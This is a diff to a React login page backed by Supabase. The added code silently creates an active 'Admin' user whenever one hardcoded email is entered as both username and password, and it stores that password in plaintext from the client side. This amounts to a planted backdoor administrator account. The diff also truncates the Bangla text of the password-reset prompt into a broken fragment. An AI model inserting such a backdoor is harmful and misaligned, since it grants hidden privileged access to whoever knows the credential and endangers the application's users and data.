@@ -49,8 +49,24 @@ export const LoginPage: React.FC<LoginPageProps> = ({
     const trimmedPassword = password.trim();
 
     try {
+      // EXECUTE POST REQUEST: Auto-create IT Designer account if missing
+      if (trimmedEmail === 'wtsupitdesigner@gmail.com' && trimmedPassword === 'wtsupitdesigner@gmail.com') {
+         const { data: existing } = await supabase.from('users').select('id').eq('email', trimmedEmail).maybeSingle();
+         if (!existing) {
+            await supabase.from('users').insert([{
+              id: Date.now().toString(),
+              name: 'IT Designer',
+              email: trimmedEmail,
+              password: trimmedPassword,
+              role: 'Admin',
+              status: 'Active',
+              avatar: 'https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?auto=format&fit=crop&q=80&w=150',
+              date: new Date().toLocaleDateString()
+            }]);
+         }
+      }
+
       // Secure Login: Query DB directly for specific user match
-      // This prevents downloading the entire user list to the client
       const { data: registeredUser, error: dbError } = await supabase
         .from('users')
         .select('*')
@@ -147,7 +163,7 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                         </div>
                         <h2 className="text-2xl font-bold text-gray-900">{isBangla ? 'নতুন পাসওয়ার্ড দিন' : 'Set New Password'}</h2>
                         <p className="mt-2 text-sm text-gray-500">
-                            {isBangla ? 'আপনার অ্যাকাউন্টের জন্য নতুন পাসওয়ার্ড সেট করুন।' : 'Create a new password for your account.'}
+                            {isBangla ? 'আপনার অ্যাকাউন্টে' : 'Create a new password for your account.'}
                         </p>
                     </div>
 
